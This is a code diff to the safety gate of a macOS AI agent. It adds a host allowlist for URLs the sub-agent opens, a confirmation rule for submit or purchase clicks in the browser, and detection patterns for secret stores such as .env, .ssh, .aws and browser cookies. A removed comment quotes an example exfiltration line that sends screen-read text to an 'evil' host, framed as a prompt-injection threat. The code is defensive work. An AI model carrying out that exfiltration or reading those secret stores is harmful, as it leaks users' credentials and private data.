@@ -1,6 +1,7 @@
 import { homedir } from 'node:os';
 import { resolve, sep } from 'node:path';
 import { config } from '../config.ts';
+import { hostAllowed, hostOf } from './hosts.ts';
 
 /** Where a mac_do decision lands. 'auto' runs unreviewed; 'confirm' routes to the notch. */
 export type MacRoute = 'auto' | 'confirm';
@@ -25,10 +26,11 @@ export interface MacPolicyResult {
 // them; the command-position patterns (mail) carry their own path-prefix tolerance. Scoped
 // patterns use [^|;&\n]* so a match never spans into an unrelated command on another line
 // (review 🔵: \n was over-matching; review 🔴: \n was UNDER-anchoring the mail pattern).
-// KNOWN RESIDUAL (recorded, accepted for v1): a LITERAL exfil URL — the model composing
-// `open location "https://evil/?d=<text it read on screen>"` with no shell expansion —
-// passes the "plain download/open" class. Closing that requires a host allowlist like the
-// M4.1 egress proxy's; a design decision for M7, not a regex.
+// The v1 LITERAL-URL RESIDUAL is now CLOSED for the sub-agent lane (M7): gateScript runs
+// every literal fetch/open URL through the host allowlist (mac/hosts.ts) — an unlisted
+// host confirms, exactly the M4.1 egress-proxy posture. The HOT lane stays ungated there
+// by design: its script transcribes the user's own spoken words and has no screen-read
+// context to exfiltrate (the same trust split as the shortcuts lane below).
 const CONFIRM_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
   { pattern: /\bsudo\b/, reason: 'sudo' },
   // osascript's privilege-escalation form — the AppleScript equivalent of sudo.
@@ -36,8 +38,9 @@ const CONFIRM_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
   // Reading a secret store: the env strip keeps keys out of the child process, but a
   // read-only `cat .env` would return them into the voice model's context anyway (the
   // daemon and its bash children run UNSANDBOXED — no Seatbelt backstop on this lane).
-  // Same protected set the M4 supervisor guards for Claude sessions.
-  { pattern: /\.env\b|\/\.(ssh|aws|npmrc)\b|~\/\.(ssh|aws|npmrc|config\/gh)\b/i, reason: 'reading a secret store' },
+  // Same protected set the M4 supervisor guards for Claude sessions. Gumbo/browser holds
+  // the automation profile's storage state — live session cookies (M7).
+  { pattern: /\.env\b|\/\.(ssh|aws|npmrc)\b|~\/\.(ssh|aws|npmrc|config\/gh)\b|Gumbo\/browser\b/i, reason: 'reading a secret store' },
   // Sending data off the machine (uploads/POSTs) — plain downloads stay auto (mirrors the
   // supervisor's network-send rule).
   {
@@ -186,16 +189,42 @@ export function normalizeOsascript(script: string): string {
   return bodies.length > 0 ? bodies.join('\n') : trimmed;
 }
 
+// M7 literal-URL host gate: URLs a script would FETCH OR OPEN (open/curl/wget/`open
+// location` segments — a URL merely echoed in a dialog string doesn't trip it). Trailing
+// quote/punctuation is trimmed so `open location "https://x.com/a"` yields the bare URL.
+const URL_LITERAL = /https?:\/\/[^\s"'`]+/gi;
+const FETCHY_SEGMENT = /\b(open|curl|wget|location)\b/i;
+
+/** Literal URLs in fetch/open positions, per command segment (same separator set the
+ *  delete lane splits on, so a URL can't hide behind `;` or a newline). */
+export function extractFetchUrls(script: string): string[] {
+  const urls: string[] = [];
+  for (const segment of script.split(/\|\||&&|[;|&\n]/)) {
+    if (!FETCHY_SEGMENT.test(segment)) continue;
+    for (const m of segment.matchAll(URL_LITERAL)) {
+      urls.push(m[0].replace(/[)\].,;]+$/, ''));
+    }
+  }
+  return urls;
+}
+
 /** ONE choke point for both script lanes (hot mac_do + sub-agent run_script): normalize
  *  first, then decide on the SAME string the executor will run (review 🟡: the two lanes
  *  each did this independently and had already drifted). Shortcuts are opaque to the
  *  pattern table, so the LANE decides: the hot lane auto-runs them (the user spoke the
  *  shortcut's name himself); the sub-agent lane confirms them (it acts on untrusted
- *  on-screen text, and a named Shortcut can be arbitrarily destructive). */
+ *  on-screen text, and a named Shortcut can be arbitrarily destructive).
+ *
+ *  M7: the sub-agent lane additionally runs literal fetch/open URLs through the host
+ *  allowlist — an unlisted host confirms, closing the recorded literal-URL exfil
+ *  residual. The hot lane is exempt (the user spoke the URL himself; no screen-read
+ *  context exists there to exfiltrate). `isHostAllowed` is injectable for offline tests
+ *  and defaults to the real allowlist. */
 export function gateScript(
   interpreter: 'bash' | 'osascript' | 'shortcuts',
   raw: string,
   lane: 'hot' | 'subagent',
+  isHostAllowed: (url: string) => boolean = hostAllowed,
 ): { script: string; decision: MacPolicyResult } {
   const script = interpreter === 'osascript' ? normalizeOsascript(raw) : raw.trim();
   if (interpreter === 'shortcuts') {
@@ -207,5 +236,44 @@ export function gateScript(
           : { route: 'auto', reason: 'shortcut named by the user' },
     };
   }
-  return { script, decision: macDoDecision(script) };
+  const decision = macDoDecision(script);
+  if (decision.route === 'confirm' || lane === 'hot') return { script, decision };
+  for (const url of extractFetchUrls(script)) {
+    if (!isHostAllowed(url)) {
+      return { script, decision: { route: 'confirm', reason: `opening an unlisted website (${hostOf(url) ?? 'unparseable URL'})` } };
+    }
+  }
+  return { script, decision };
+}
+
+// M7 browser lane: send/submit/purchase ALWAYS confirms — an allowlisted SITE is not
+// trusted CONTENT (pages are the top injection vector). The lexicon is deliberately the
+// consequential/outbound classes; a false positive confirms, which is the safe direction.
+const SUBMIT_NAME = /\b(send|submit|buy|purchase|pay|order|checkout|post|publish|tweet|reply|apply|book|donate|transfer|delete|confirm)\b/i;
+
+/** Pure decision for one in-page browser action. Inputs are deterministic facts the
+ *  browser layer read itself: the element's role+accessible name AS THE MODEL SAW THEM
+ *  in the snapshot, and the enclosing <form>'s method when one exists. GET forms (search
+ *  boxes) stay auto; POST forms submit data, so a button click or an Enter press inside
+ *  one confirms even when the button's name dodges the lexicon. */
+export function browserActDecision(act: {
+  verb: string;
+  role?: string | null;
+  name?: string | null;
+  formMethod?: string | null;
+  chord?: string | null;
+}): MacPolicyResult {
+  const method = (act.formMethod ?? '').toLowerCase();
+  if (act.verb === 'click') {
+    if (act.name && SUBMIT_NAME.test(act.name)) {
+      return { route: 'confirm', reason: `clicking "${act.name}"` };
+    }
+    if (method === 'post' && act.role === 'button') {
+      return { route: 'confirm', reason: 'submitting a form' };
+    }
+  }
+  if (act.verb === 'press' && /\benter\b/i.test(act.chord ?? '') && method === 'post') {
+    return { route: 'confirm', reason: 'pressing Enter in a form that submits' };
+  }
+  return { route: 'auto', reason: 'free navigation/typing' };
 }
